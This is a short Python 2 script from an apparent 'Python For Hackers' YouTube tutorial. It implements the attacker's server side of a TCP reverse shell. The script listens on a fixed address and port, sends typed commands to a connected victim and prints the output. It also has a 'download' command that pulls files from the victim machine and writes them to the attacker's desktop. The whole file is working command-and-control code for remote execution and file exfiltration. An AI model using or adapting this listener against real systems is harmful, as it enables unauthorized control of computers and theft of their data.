# Python For Hackers - Priyank Gada
# Downloading Data TCP Shell - Server Side .
# www.youtube.com/priyankgada


import socket 
import os      # Again OS Like in the client side for file operations.

# Transfer Function
# Downloaded file will be stored as PNG file on desktop 
# If DONE then f.close 
def transfer(conn,command):
    
    conn.send(command)
    f = open('/root/Desktop/test.png','wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed '
            f.close()
            break
        f.write(bits)
# Old Shell for command execution 

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.10.10.10", 8080))
    s.listen(1)
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept()
    print '[+] We got a connection from: ', addr



    while True:       
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close() 
            break


# setting the download keyword
        elif 'download' in command: 
            transfer(conn,command)

        else:
            conn.send(command) 
            print conn.recv(1024) 
        
def main ():
    connect()
main()
#end :) Subscribe to my channel.
